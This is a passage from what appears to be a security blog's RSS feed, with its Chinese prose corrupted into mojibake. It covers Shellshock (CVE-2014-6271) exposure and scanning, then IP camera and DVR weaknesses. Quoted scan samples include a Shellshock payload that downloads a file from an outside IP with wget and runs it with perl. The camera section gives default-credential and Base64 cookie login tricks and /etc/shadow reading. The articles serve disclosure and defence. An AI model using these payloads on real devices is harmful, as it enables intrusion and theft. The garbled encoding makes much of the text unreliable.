      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Synology&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;5.0-4493 update 7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO (å·²ä¿®å¾©)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ç¹é-gitsubversion-ä¼ºæœå™¨çš„-shell-é™åˆ¶&quot;&gt;ç¹é Git/Subversion ä¼ºæœå™¨çš„ shell é™åˆ¶&lt;/h4&gt;

&lt;p&gt;Shellshock ä¹Ÿå¸¸è¢«åˆ©ç”¨ä¾†ç¹éä¼ºæœå™¨çš„ shell é™åˆ¶ï¼Œæœ€å¸¸è¦‹çš„å°±æ˜¯ Git å’Œ Subversion ä¼ºæœå™¨ï¼š&lt;br /&gt;
é€šå¸¸é€™äº›ä¼ºæœå™¨å…è¨±é€é SSH é€£ç·šï¼Œä½†ç™»å…¥å¾Œéƒ½å°æ‡‰è‘—å—é™åˆ¶çš„ shellã€‚é€éæ­¤æ¼æ´ï¼Œå¯ä»¥ç¹é shell çš„é™åˆ¶ï¼ŒåŸ·è¡ŒæŒ‡ä»¤å¦‚ä¸‹åœ–ã€‚ï¼ˆè¨»ï¼šOS ä¸­ git user é è¨­ shell è¦ç‚º bash æ‰æœƒå—åˆ°å½±éŸ¿ï¼‰&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140930/shellshock_test_git.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140930/shellshock_test_git.png&quot; alt=&quot;ç¹é Git/Subversion ä¼ºæœå™¨çš„ shell é™åˆ¶&quot; title=&quot;ç¹é Git/Subversion ä¼ºæœå™¨çš„ shell é™åˆ¶&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä¸€èˆ¬æˆ‘å€‘è¦å¯¦ä½œç‰¹å®šä½¿ç”¨è€…ç™»å…¥ ssh åªèƒ½åšç‰¹å®šçš„äº‹æƒ…ï¼Œå¸¸å¸¸æœƒåœ¨ sshd_config è¨­å®š ForceCommandï¼Œæˆ–æ˜¯åœ¨ authorized_keys è¨­å®š command= å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA18S2t...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™æ¬¡æœƒå—åˆ° Shellshock å½±éŸ¿ï¼Œå°±æ˜¯å› ç‚ºé€™äº›è¨­å®šæœƒåœ¨ä½¿ç”¨è€…é€é ssh ç™»å…¥æ™‚ï¼Œå‘¼å« bash åŸ·è¡Œï¼Œç•¶ç’°å¢ƒè®Šæ•¸è¢«å¼•å…¥ï¼Œæƒ¡æ„çš„ç¨‹å¼ç¢¼å°±æœƒè¢«åŸ·è¡Œäº†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;shellshock-å¨è„…ä»åœ¨æ“´å¤§&quot;&gt;Shellshock å¨è„…ä»åœ¨æ“´å¤§&lt;/h3&gt;

&lt;p&gt;ç›®å‰ä¸ç®¡æ˜¯ç™½å¸½é§­å®¢æˆ–æ˜¯é»‘å¸½é§­å®¢éƒ½é‚„åœ¨æŒçºŒå°‹æ‰¾å¯ä»¥åˆ©ç”¨ Shellshock çš„åœ°æ–¹ï¼Œå¦‚åŒå‰é¢æ‰€è¿°ï¼Œæ‰¾åˆ°å¯ä»¥å¯«å…¥ç’°å¢ƒè®Šæ•¸çš„åœ°æ–¹ï¼Œä¸¦ä¸”é †åˆ©å‚³å…¥ bash åŸ·è¡Œï¼Œå°±å¯ä»¥åˆ©ç”¨è©²å¼±é»ä¾†åŸ·è¡Œæ›´é€²ä¸€æ­¥çš„æ”»æ“Šã€‚&lt;/p&gt;

&lt;p&gt;å¾ Shellshock çˆ†ç™¼è‡³ä»Šï¼Œé™¸é™¸çºŒçºŒå‚³å‡ºäº†å¾ˆå¤šå…¬å¸çš„ç”¢å“å—åˆ°æ­¤å¼±é»å½±éŸ¿ï¼Œæ•´ç†&lt;a href=&quot;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=252743&amp;amp;SearchOrder=4&quot;&gt;åœ¨æ­¤&lt;/a&gt;ï¼Œä¹Ÿæœ‰ä¸€äº› POC æ•´ç†åœ¨&lt;a href=&quot;https://github.com/mubix/shellshocker-pocs/&quot;&gt;é€™è£¡&lt;/a&gt;ã€‚ å…¶ä¸­ä¸ä¹å‡ºç¾ä¸€äº›å¸¸ç”¨çŸ¥åå¥—ä»¶å¦‚ï¼šOpenVPNã€Pure-FTPdï¼Œè€Œä¸”æŒçºŒæ›´æ–°ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;ç¾åœ¨é‡å° HTTP ä¼ºæœå™¨çš„æ”»æ“Šé‚„æ˜¯ä½”å¤šæ•¸ï¼Œæˆªè‡³ç›®å‰ç‚ºæ­¢æˆ‘å€‘ä»æŒçºŒç™¼ç¾ç¶²è·¯ä¸Šæœ‰å„ç¨®æƒææ¨£æœ¬ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;() { :;}; /bin/bash -c &quot;echo testing9123123&quot;; /bin/uname -a&lt;/li&gt;
  &lt;li&gt;() { :;}; /bin/bash -c &quot;wget -P /var/tmp 174.143.2XX.XX/â€¦/x ; perl /var/tmp/x&quot;&lt;/li&gt;
  &lt;li&gt;() { :;};echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF$(echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF)vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é™¤äº†é€™äº›é™¸çºŒé‡å° HTTP ä¼ºæœå™¨çš„æ¡ˆä¾‹ï¼Œæˆ‘å€‘èªç‚ºï¼Œä¸€äº›å…¬å¸è³¼å…¥çš„ç¶²è·¯è¨­å‚™æ˜¯ Shellshock æ½›åœ¨é«˜å±éšªç¾¤ï¼Œé‚£äº›è²·ä¾†å°±æ“ºåœ¨æ—é‚Šç¶­é‹çš„è¨­å‚™ï¼Œä¸€ä¾†å®¹æ˜“è¢«å¿½ç•¥ï¼ŒäºŒä¾†æ˜¯å…¶æ›´æ–°ä¸æ˜“ï¼Œä¸‰ä¾†é€™äº›è¨­å‚™å¸¸ä½¿ç”¨åˆ° bashï¼Œå› æ­¤ä»æ˜¯ç¾åœ¨æƒ¡æ„æ”»æ“Šè€…å°ˆæ³¨ç ”ç©¶çš„ç›®æ¨™ï¼Œè«‹å¤§å®¶ç‰¹åˆ¥å°å¿ƒã€‚&lt;/p&gt;

&lt;h3 id=&quot;çµè«–ç„¡éœ€éåº¦ææ…Œä½†åˆ¥æ‰ä»¥è¼•å¿ƒ&quot;&gt;çµè«–ï¼šç„¡éœ€éåº¦ææ…Œï¼Œä½†åˆ¥æ‰ä»¥è¼•å¿ƒ&lt;/h3&gt;

&lt;p&gt;ã€Œåªè¦æœ‰ bash çš„ç³»çµ±å…¨éƒ¨éƒ½æ˜¯å—é§­ç¯„åœï¼ã€&lt;/p&gt;

&lt;p&gt;ä¸å°‘æœ‹å‹çœ‹åˆ°æœ€è¿‘ Shellshock çš„æ–°èå ±å°ï¼Œéƒ½ååˆ†ç·Šå¼µã€‚å„˜ç®¡å„ä½æ‰€ä½¿ç”¨çš„ bash æ˜¯å«æœ‰æ¼æ´çš„ç‰ˆæœ¬ï¼Œä½†è¦æˆåŠŸåŸ·è¡Œæ”»æ“Šæ‰‹æ³•éœ€è¦è¨±å¤šæ¢ä»¶ï¼Œè¢«æ”»æ“Šè€…å¾é ç«¯æ”»æ“Šçš„æ©Ÿç‡åä½ï¼Œå› æ­¤å¤§å®¶ä¸éœ€è¦å¤ªéææ…Œï¼Œåªè¦æ³¨æ„ä»¥ä¸‹è¨­å‚™æˆ–ä¼ºæœå™¨ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç‰¹å®š Linux ç‰ˆæœ¬ï¼Œä¸¦ä¸”ä½¿ç”¨ DHCP é€£ç·š&lt;/li&gt;
  &lt;li&gt;ç¶²è·¯ã€è³‡å®‰è¨­å‚™&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ CGI çš„ç¶²ç«™ä¼ºæœå™¨&lt;/li&gt;
  &lt;li&gt;å·²ç¶“å…¬å¸ƒå«æœ‰å¼±é»çš„å¥—ä»¶&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é‚£æˆ‘å€‘è©²æ€éº¼è‡ªä¿å‘¢ï¼Ÿåœ¨æ”»æ“Šæ‰‹æ³•ä¸æ–·ç²¾é€²ä¹‹ä¸‹ï¼Œåªéæ¿¾ CVE-2014-6271 çš„æ”»æ“Šå­—ä¸²ä¸¦æ²’æœ‰è¾¦æ³•å®Œå…¨é˜»æ“‹æ”»æ“Šã€‚å»ºè­°å¯ä»¥å…ˆå°‡ä¼ºæœå™¨çš„ bash å‡ç´šè‡³æœ€æ–°ç‰ˆæœ¬ï¼Œä¸¦æŒçºŒé—œæ³¨å¾ŒçºŒæ›´æ–°è¨Šæ¯ï¼ˆç›®å‰æŒçºŒæœ‰ç¹éæª¢æŸ¥çš„æ–° CVE å¼±é»ç™¼ä½ˆï¼‰ï¼Œä½¿ç”¨ CGI ä¹‹ä¼ºæœå™¨æ­é… iptablesã€IDSã€Mod Security ç­‰æ©Ÿåˆ¶åµæ¸¬æ”»æ“Šç‰¹å¾µä¸¦å°‡å…¶é˜»æ“‹ã€‚è‹¥æœ‰è¨­å‚™åœ¨é€™æ¬¡çš„å½±éŸ¿ç¯„åœï¼Œä¹Ÿè¨˜å¾—å‘åŸå» ç´¢å–æ›´æ–°ç¨‹å¼ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é¡Œå¤–è©±&quot;&gt;é¡Œå¤–è©±&lt;/h3&gt;

&lt;p&gt;æœ‰äººèªªï¼šã€ŒLinux åœ¨ 2014 å¹´æ¥é€£å‡ºåŒ…ï¼ŒçœŸæ˜¯ä¸€å€‹ä¸å®‰å…¨çš„ä½œæ¥­ç³»çµ±ï¼åè§€ Windows åœ¨é€™å¹¾æ¬¡éƒ½æ¯«ç„¡å½±éŸ¿ï¼Œä¼æ¥­æ‡‰è©²è¦å…¨é¢æ”¹ç”¨ Microsoft Solutionï¼ã€ï¼Œä½†é€™çœŸçš„æ˜¯æ­£ç¢ºçš„æƒ³æ³•å—ï¼Ÿå…¶å¯¦ä¸€å€‹ OpenSource çš„ç³»çµ±ã€è»Ÿé«”ï¼Œå¯ä»¥è—‰ç”±ç¤¾ç¾¤çš„åŠ›é‡æª¢è¦–åŸå§‹ç¢¼çš„å•é¡Œï¼Œé›†åˆçœ¾äººçš„åŠ›é‡è®“ç³»çµ±è®Šå¾—æ›´åŠ å®‰å…¨ã€‚å› æ­¤æœ‰è¢«æ­éœ²å‡ºæ¼æ´ï¼Œå°æ–¼ä¸€å€‹ç³»çµ±ä¾†èªªæ˜¯å¥½äº‹ã€‚è€Œé OpenSource çš„ç³»çµ±ï¼Œå°±åªèƒ½ä»°è³´åŸå» è‡ªå·±çš„è³‡å®‰åœ˜éšŠé€²è¡Œç ”ç©¶ï¼Œæˆ–è€…æ˜¯å¤–éƒ¨è³‡å®‰äººå“¡çš„ç™¼æ˜äº†ã€‚é¸æ“‡ä½œæ¥­ç³»çµ±çš„åŸå‰‡ï¼Œæœ€å¥½ä¾ç…§ç³»çµ±çš„åŠŸèƒ½éœ€æ±‚ã€ç”¢å“å®šä½ã€å®‰å…¨æ¼æ´çš„ä¿®è£œé€Ÿåº¦ç­‰å±¤é¢ï¼Œæ‰èƒ½å¤ é¸ç”¨çœŸæ­£ç¬¦åˆè‡ªå·±éœ€è¦çš„ç³»çµ±ã€‚&lt;/p&gt;

&lt;h3 id=&quot;è¨»è§£&quot;&gt;è¨»è§£&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note2&quot;&gt;
      &lt;p&gt;è‹¥æ‰‹å‹•åŸ·è¡Œ dhclientï¼Œå‰‡æœƒé­åˆ°æ¼æ´å½±éŸ¿ã€‚Â &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;Â &lt;a href=&quot;#fnref:note2:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note1&quot;&gt;
      &lt;p&gt;ç³»çµ±ç’°å¢ƒè®Šæ•¸æœƒå—åˆ°å½±éŸ¿ï¼Œä½†ç„¡æ³•è¢«æ”»æ“Šè€…åˆ©ç”¨ã€‚Â &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/</link>
                <guid>https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271</guid>
                <pubDate>Tue, 30 Sep 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR çš„è³‡å®‰è­°é¡Œ - ä½ çŸ¥é“æˆ‘åœ¨çœ‹ä½ å—ï¼Ÿ</title>
                <description>&lt;p&gt;ç¶²è·¯æ”å½±æ©Ÿçš„æ™®åŠç‡åœ¨è¿‘å¹¾å¹´ä¾†æŒçºŒæ”€å‡ï¼Œé™¤äº†è€äººèˆ‡å¹¼å…’å±…å®¶ç…§è­·ã€ä¼æ¥­å®¤å…§ç›£æ§ç­‰éœ€æ±‚è¿…é€Ÿå¢åŠ ä¹‹å¤–ï¼Œçµåˆæ‰‹æ©Ÿæ‡‰ç”¨ç¨‹å¼è®“äººå¯éš¨æ™‚éš¨åœ°è§€çœ‹å½±åƒçš„æ–¹ä¾¿æ€§ä¹Ÿæˆç‚ºæ™®åŠçš„åŸå› ã€‚ç•¶å¤§å®¶é‚„ä»¥ç‚ºé»‘å¸½é§­å®¢çš„ç›®æ¨™ä»ç„¶æ˜¯ç¶²ç«™ã€å€‹äººé›»è…¦æ™‚ï¼Œå·²ç¶“æœ‰è¨±å¤šæ”»æ“Šè€…æ‚„æ‚„åœ°å°‡ç›®æ¨™è½‰å‘äº†å„ç¨®ç‰©é€£ç¶²è¨­å‚™ï¼Œä¾‹å¦‚ NASã€Wireless APã€Printer ç­‰ç”¢å“ï¼Œè€Œæ“æœ‰çœ¾å¤šç”¨æˆ¶çš„ç¶²è·¯æ”å½±æ©Ÿç†æ‰€ç•¶ç„¶åœ°ä¹Ÿæ˜¯ç›®æ¨™ä¹‹ä¸€ã€‚èº«ç‚ºå®‰æ§ç”¢å“ï¼Œå»é€ æˆä¸€é …è³‡å®‰çš„éš±æ†‚ï¼Œæ˜¯ä¸æ˜¯æœ‰é»è«·åˆºå‘¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;æ°å¥½æœ€è¿‘å¹¾å¤©å¿½ç„¶çœ‹åˆ°æœ‰æ–°èå ±å°&lt;a href=&quot;http://news.ltn.com.tw/news/world/breakingnews/1112329&quot;&gt;ã€Œå®¶ç”¨ç›£è¦–å™¨é­é§­å®¢å…¥ä¾µ éš±ç§å…¨è¢«çœ‹å…‰å…‰ã€&lt;/a&gt;é€™æ¨£å­çš„æ¡ˆä¾‹ï¼Œè€Œåœ¨å»å¹´ä¹Ÿæœ‰é¡ä¼¼çš„å ±å°&lt;a href=&quot;http://news.networkmagazine.com.tw/classification/security/2013/06/18/51531/&quot;&gt;ã€Œæ•¸åè¬æ”¯ç›£æ§æ”å½±æ©Ÿæ½›è—è¢«é§­æ¼æ´ é›»å½±æƒ…æ™¯æçœŸå¯¦ä¸Šæ¼”ã€&lt;/a&gt;ï¼Œè®“æˆ‘å€‘ä¸ç¦æƒ³å°é€™å€‹äº‹ä»¶åšå€‹æ·±å…¥çš„èª¿æŸ¥ã€‚å°±è®“æˆ‘å€‘ä¾†çœ‹çœ‹ç¶²è·¯æ”å½±æ©Ÿä»¥åŠç›¸é—œç”¢å“ç©¶ç«Ÿæœ‰å“ªäº›é¢¨éšªå§ï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;cve&quot;&gt;CVE&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘å…ˆä¾†çœ‹çœ‹å¹¾å€‹å¤§å» åœ¨ 2013 å¹´åˆ° 2014 å¹´ä¹‹é–“æœ‰å“ªäº›å·²ç¶“è¢«å…¬é–‹æ­éœ²çš„ CVE å¼±é»ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;AVTECH: 3, CVE-2013-4980, CVE-2013-4981, CVE-2013-4982&lt;/li&gt;
  &lt;li&gt;AXIS: 2, CVE-2013-3543, CVE-2011-5261&lt;/li&gt;
  &lt;li&gt;Hikvision: 3, CVE-2013-4975, CVE-2013-4976, CVE-2013-4977&lt;/li&gt;
  &lt;li&gt;SONY: 1, CVE-2013-3539&lt;/li&gt;
  &lt;li&gt;Vivotek: 6, CVE-2013-1594, CVE-2013-1595, CVE-2013-1596, CVE-2013-1597, CVE-2013-1598, CVE-2013-4985&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è®€è€…å€‘è‹¥é€²ä¸€æ­¥å»çœ‹å„å€‹ CVE çš„è©³ç´°è³‡æ–™ï¼Œæœƒç™¼ç¾æœ‰è¨±å¤šå¼±é»éƒ½æ˜¯å±¬æ–¼å¯åŸ·è¡Œä»»æ„æŒ‡ä»¤çš„åš´é‡æ¼æ´ï¼Œå…¶å½±éŸ¿ç¨‹åº¦éå¸¸é«˜ï¼Œå·²ä¸åªæ˜¯é—œæ–¼æ”å½±å…§å®¹æ˜¯å¦è¢«ç«Šå–ï¼Œæ›´æœ‰å¯èƒ½è¢«åˆ©ç”¨æ­¤é¡è¨­å‚™é€²ä¸€æ­¥æ”»æ“Šå…¶ä»–å…§ã€å¤–ç¶²æ©Ÿå™¨ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å°ç£ç¾æ³&quot;&gt;å°ç£ç¾æ³&lt;/h3&gt;

&lt;p&gt;é›–ç„¶ä¸Šé¢æåˆ°è¨±å¤šçŸ¥åå» ç‰Œçš„åš´é‡æ¼æ´ï¼Œä½†æ˜¯æ¯å€‹åœ‹å®¶ä½¿ç”¨çš„å®‰æ§è¨­å‚™ä¸è¦‹å¾—éƒ½æ˜¯ä¸Šè¿°å¹¾å€‹ç‰Œå­ï¼Œè€Œèº«ç‚ºè³‡å®‰æ¥­è€…ï¼Œéš¨æ™‚é—œæ³¨è‡ªå·±åœ‹å®¶çš„ç¶²è·¯ç¾æ³ä¹Ÿæ˜¯å¾ˆåˆç†çš„äº‹æƒ…ï½åœ¨æˆ‘å€‘çš„å¤§é‡è§€æ¸¬ä¸‹ï¼Œç™¼ç¾æœ‰è¨±å¤š IP Cameraã€&lt;a href=&quot;http://en.wikipedia.org/wiki/Digital_video_recorder&quot;&gt;DVR (Digital Video Recoder)&lt;/a&gt;ã€&lt;a href=&quot;http://en.wikipedia.org/wiki/Network_Video_Recorder&quot;&gt;NVR (Network Video Recoder)&lt;/a&gt; éƒ½å­˜åœ¨è³‡å®‰è­°é¡Œï¼Œæˆ‘å€‘å¾å…¶ä¸­æå‡ºå¹¾å€‹æœ‰è¶£çš„æ¡ˆä¾‹è·Ÿå„ä½åˆ†äº«ä¸€ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;æŸåœ‹å¤– V ç‰Œå» å•† ï¼ˆæ•¸é‡ï¼š320+ï¼‰&lt;/p&gt;

    &lt;p&gt;ä¸€èˆ¬çš„ç”¢å“é€šå¸¸éƒ½æœƒæœ‰é è¨­å¸³è™Ÿå¯†ç¢¼ï¼Œä½†é€™é–“å» å•†çš„ç”¢å“ä¼¼ä¹æ²’æœ‰é è¨­å¸³è™Ÿå¯†ç¢¼ï¼Œè‹¥ä½¿ç”¨è€…æœªè¨­å®šå¸³è™Ÿå¯†ç¢¼ï¼Œæ”»æ“Šè€…åªè¦ç›´æ¥é»ã€ŒOKã€æŒ‰éˆ•å°±å¯ä»¥ç™»å…¥ç³»çµ±ï¼Œè€Œé€™æ¨£å­çš„ DVR åœ¨å°ç£æœ‰ä¸‰ç™¾å¤šå°ï¼Œä¹Ÿå°±æ˜¯æœ‰ä¸‰ç™¾å¤šå° DVR åœ¨ç¶²è·¯ä¸Šè£¸å¥”â€¦&lt;a href=&quot;/assets/img/blog/20140924/case_study_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_01.png&quot; alt=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 1&quot; title=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æŸåœ‹å¤– H ç‰Œå» å•† ï¼ˆæ•¸é‡ï¼š1200+ï¼‰&lt;/p&gt;

    &lt;p&gt;æœ‰äº›å» å•†ç‚ºäº†æ–¹ä¾¿ç¶­ä¿®æˆ–è€…å…¶ä»–ç†ç”±ï¼Œæœƒåœ¨ NVR ä¸Šé–‹å•Ÿäº† Telnet æœå‹™ï¼Œé›–ç„¶å¢åŠ äº†è¢«æ”»æ“Šçš„æ©Ÿç‡ï¼Œä½†æ˜¯è‹¥å¯†ç¢¼å¼·åº¦è¶³å¤ ä¸”æ²’æœ‰å¤–æµï¼Œä¹Ÿä¸æœƒéš¨ä¾¿è¢«æ‰“é€²å»ã€‚è€Œé€™é–“å» å•†éå¸¸æœ‰è¶£ï¼Œé™¤äº† root å¸³è™Ÿä¹‹å¤–é‚„æœ‰ä¸€çµ„ guest å¸³è™Ÿï¼Œä¸¦ä¸” guest çš„å¯†ç¢¼éå¸¸ç°¡å–®ï¼ŒåŠ ä¸Šç•¶åˆå»ºç½®ç³»çµ±æ™‚ä¸¦æœªæª¢æŸ¥æ©Ÿæ•æª”æ¡ˆçš„æ¬Šé™æ˜¯å¦è¨­å®šéŒ¯èª¤ï¼Œå°è‡´æ”»æ“Šè€…å¯å…ˆç”¨ guest å¸³è™Ÿç™»å…¥ï¼Œå†å» /etc/shadow è®€å– root å¯†ç¢¼åŠ ä»¥ç ´è§£ï¼Œé€²ä¸€æ­¥å–å¾—è¨­å‚™æ‰€æœ‰æ¬Šé™ã€‚&lt;a href=&quot;/assets/img/blog/20140924/case_study_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_02.png&quot; alt=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 2&quot; title=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æŸåœ‹å¤– D ç‰Œå» å•† ï¼ˆæ•¸é‡ï¼š700+ï¼‰&lt;/p&gt;

    &lt;p&gt;é€™å€‹æ¡ˆä¾‹å¯¦åœ¨æ˜¯ä»¤äººå“­ç¬‘ä¸å¾—ï¼Œä¸çŸ¥é“æ˜¯åŸå» é‚„æ˜¯å°ç£ä»£ç†å•†éå¸¸å¥½å¿ƒåœ°å¹«ä½¿ç”¨è€…å»ºç«‹äº†å¤šçµ„é è¨­å¸³è™Ÿï¼ŒåŒ…å« adminã€666666ã€888888 ç­‰ç­‰ï¼Œè€Œä¸”å¯†ç¢¼ä¹Ÿè¨­å®šå¾—å¾ˆç°¡å–®ã€‚ä½†æ˜¯é€šå¸¸è¦ä½¿ç”¨è€…è¨˜å¾—æ”¹ä¸€çµ„é è¨­å¯†ç¢¼å·²ç¶“éå¸¸å›°é›£ï¼Œæ›´ä½•æ³æ˜¯è¦ä½¿ç”¨è€…æ”¹ä¸‰çµ„å¯†ç¢¼å‘¢ï¼Ÿé€™ç¨®æƒ…å½¢å°è‡´æ”»æ“Šè€…å¯ä»¥è¼•è€Œæ˜“èˆ‰åœ°æ‹¿è‘—å¼±å¯†ç¢¼åˆ°è™•çŒœï¼Œå¤§å¤§æé«˜äº†ç”¨æˆ¶çš„å—å®³æ©Ÿç‡ã€‚è€Œæ›´æœ‰è¶£çš„æ˜¯ï¼Œä¸çŸ¥é“æ˜¯åŸºæ–¼æ­·å²åŒ…è¢±æˆ–è€…å…¶ä»–åŸå› ï¼Œæ­¤è¨­å‚™é–‹äº†ç‰¹æ®Šçš„ portï¼Œç›´æ¥é€å‡ºå«æœ‰ç‰¹å®šå…§å®¹çš„å°åŒ…åˆ°é€™å€‹ port å°±å¯ä»¥åŸ·è¡Œç›¸å°æ‡‰çš„æŒ‡ä»¤ï¼Œä¾‹å¦‚å¯ä»¥å–å¾—å¸³è™Ÿå¯†ç¢¼ã€ä½¿ç”¨è€… email ç­‰ç­‰ï¼Œè€Œåœ¨é€™å€‹éç¨‹ä¸­å®Œå…¨æ²’æœ‰ä»»ä½•èªè­‰æ©Ÿåˆ¶ï¼ç­‰æ–¼åˆæœ‰ä¸ƒç™¾å¤šå° NVR åœ¨ç¶²è·¯ä¸Šè£¸å¥”â€¦&lt;a href=&quot;/assets/img/blog/20140924/case_study_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_03.png&quot; alt=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 3&quot; title=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 3&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æŸåœ‹å…§ A ç‰Œå» å•† ï¼ˆæ•¸é‡ï¼š1000+ï¼‰&lt;/p&gt;

    &lt;p&gt;é€™é–“å» å•†ä¹Ÿæ˜¯ä½¿ç”¨å¸¸è¦‹çš„é è¨­å¸³è™Ÿå¯†ç¢¼ï¼Œä½†å®ƒå¯æ€•çš„åœ°æ–¹é‚„ä¸æ­¢æ–¼æ­¤ã€‚è©²ç³»çµ±å°‡å¸³è™Ÿå¯†ç¢¼è½‰ç‚º Base64 ç·¨ç¢¼å¾Œç›´æ¥ç•¶ä½œ cookie å…§å®¹ï¼Œå› æ­¤è‹¥é è¨­å¸³è™Ÿå¯†ç¢¼åˆ†åˆ¥æ˜¯ abc èˆ‡ 123ï¼Œå°‡ abc:123 ç”¨ Base64 ç·¨ç¢¼éå¾Œå¯å¾—åˆ° YWJjOjEyMw==ï¼Œæ¥è‘—å°‡ Cookie: SSID=YWJjOjEyMw== é€™ä¸²å…§å®¹åŠ åˆ° request çš„ HTTP header ä¸­ï¼Œå°±å¯ä»¥åˆ°è™•æ¸¬è©¦è©²è¨­å‚™æ˜¯å¦ä½¿ç”¨é è¨­å¸³è™Ÿå¯†ç¢¼ï¼Œç”šè‡³é‚„å¯ä»¥é€²ä¸€æ­¥ä¸‹è¼‰å‚™ä»½æª”ï¼Œå¯Ÿçœ‹ä½¿ç”¨è€…æœ‰ç„¡å¡«å¯« emailã€ç¶²è·¯å¸³è™Ÿå¯†ç¢¼ç­‰è³‡æ–™ã€‚&lt;a href=&quot;/assets/img/blog/20140924/case_study_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_04.png&quot; alt=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 4&quot; title=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 4&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æŸåœ‹å…§ A ç‰Œå» å•†ï¼ˆæ•¸é‡ï¼š10+ï¼‰&lt;/p&gt;

